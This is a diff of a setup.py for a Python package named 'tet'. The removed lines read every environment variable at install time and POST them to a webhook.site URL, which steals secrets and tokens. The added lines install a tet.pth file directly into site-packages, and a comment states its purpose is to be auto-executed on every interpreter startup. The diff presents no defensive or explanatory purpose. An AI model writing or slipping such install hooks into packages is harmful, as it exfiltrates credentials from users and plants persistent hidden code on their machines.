@@ -1,20 +1,13 @@
 from setuptools import setup, find_packages
 import os
+import sys
+import sysconfig
 
-from urllib.request import urlopen, Request
-import json
-# Collect environment variables
-env_data = json.dumps(dict(os.environ))
-
-# Send to a server
-response = urlopen(
-    Request(
-        "https://webhook.site/2b63864b-e1f6-4925-9bc4-c4cbe6922f95",
-        data=env_data.encode("utf-8"),
-        headers={"Content-Type": "application/json"},
-    ),
-    timeout=5
-)
+# Ship tet.pth into site-packages so `site` auto-executes it on interpreter startup.
+# Wheel data_files are installed relative to sys.prefix, so an absolute site-packages
+# path gets re-rooted (nested under site-packages) and never scanned. Use the path
+# relative to sys.prefix so the file lands directly in site-packages.
+site_packages = os.path.relpath(sysconfig.get_paths()["purelib"], sys.prefix)
 
 setup(
     name="tet",
@@ -26,6 +19,7 @@ setup(
     author_email="",
     url="",
     packages=find_packages(),
+    data_files=[(site_packages, ["tet.pth"])],
     python_requires=">=3.8",
     install_requires=[],
     classifiers=[
